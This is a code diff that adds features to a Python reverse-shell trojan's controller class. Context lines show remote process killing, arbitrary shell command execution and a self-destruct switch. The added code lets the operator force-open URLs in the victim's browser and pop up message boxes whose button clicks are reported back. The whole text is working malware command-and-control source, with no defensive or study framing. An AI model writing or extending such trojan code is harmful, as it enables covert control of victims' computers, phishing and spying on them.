@@ -369,6 +369,8 @@ class ReverseShellServer:
         print("suspend <name>    - Suspend process by name or PID")
         print("kill <name>       - Kill process by name or PID")
         print("kill_switch       - Self-destruct trojan")
+        print("open_page <url>   - Open URL in browser")
+        print("msgbox <title>|<message>|<type> - Show message box (types: info, warning, error)")
         print("<command>         - Execute shell command")
         print("exit/quit         - Exit shell")
         print("help              - Show this help")
@@ -480,6 +482,32 @@ class ReverseShellServer:
         elif command.lower().startswith('kill '):
             process_name = command[5:].strip()
             self.send_encrypted(client_sock, {"type": "kill_process", "command": process_name})
+
+        elif command.lower().startswith('open_page '):
+            url = command[10:].strip().strip('"\'')
+            self.send_encrypted(client_sock, {"type": "open_page", "command": url})
+
+        elif command.lower().startswith('msgbox '):
+            # Format: msgbox Title|Message|type
+            # or just: msgbox Message
+            params = command[7:].strip()
+            
+            if '|' in params:
+                parts = params.split('|')
+                title = parts[0].strip().strip('"\'') if len(parts) > 0 else "Message"
+                message = parts[1].strip().strip('"\'') if len(parts) > 1 else params
+                msg_type = parts[2].strip().lower() if len(parts) > 2 else "info"
+            else:
+                title = "Message"
+                message = params.strip('"\'')
+                msg_type = "info"
+            
+            self.send_encrypted(client_sock, {
+                "type": "messagebox",
+                "title": title,
+                "message": message,
+                "msg_type": msg_type
+            })
         
         elif command.lower() == 'kill_switch':
             self.send_encrypted(client_sock, {"type": "kill_switch"})
@@ -609,6 +637,23 @@ class ReverseShellServer:
                     self.display_killed_processes(result)
                 elif "error" in result:
                     print(f"[-] Kill error: {result['error']}")
+            elif "open_page_result" in response:
+                result = response["open_page_result"]
+                if "success" in result and result["success"]:
+                    print(f"[+] {result.get('message', 'URL opened successfully')}")
+                elif "error" in result:
+                    print(f"[-] Open page error: {result['error']}")
+            elif "messagebox_result" in response:
+                result = response["messagebox_result"]
+                if "success" in result and result["success"]:
+                    print(f"[+] Message box displayed!")
+                    print(f"    Title: {result.get('title', 'N/A')}")
+                    print(f"    Content: {result.get('content', 'N/A')}")
+                    print(f"    Type: {result.get('type', 'info')}")
+                    if "response" in result:
+                        print(f"    User clicked: {result['response']}")
+                elif "error" in result:
+                    print(f"[-] Message box error: {result['error']}")
             elif "killed" in response:
                 print(f"[+] {response['killed']}\n")
                 return False
